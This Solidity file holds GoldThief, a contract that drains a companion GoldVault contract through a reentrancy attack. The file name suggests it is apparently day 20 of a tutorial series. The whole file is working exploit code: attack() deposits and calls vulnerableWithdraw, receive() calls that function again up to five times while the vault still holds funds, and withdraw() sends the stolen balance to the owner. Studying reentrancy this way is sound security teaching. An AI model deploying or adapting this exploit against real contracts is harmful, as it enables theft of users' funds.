// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./day20_goldvault.sol";

contract GoldThief {
    GoldVault public vault;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;
    address public owner;
    
    constructor(address _vault) {
        vault = GoldVault(_vault);
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function attack() external payable onlyOwner {
        vault.deposit{value: msg.value}();
        attackCount = 0;
        vault.vulnerableWithdraw();
    }
    
    receive() external payable {
        if (attackCount < maxAttacks && address(vault).balance > 0) {
            attackCount++;
            vault.vulnerableWithdraw();
        }
    }
    
    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}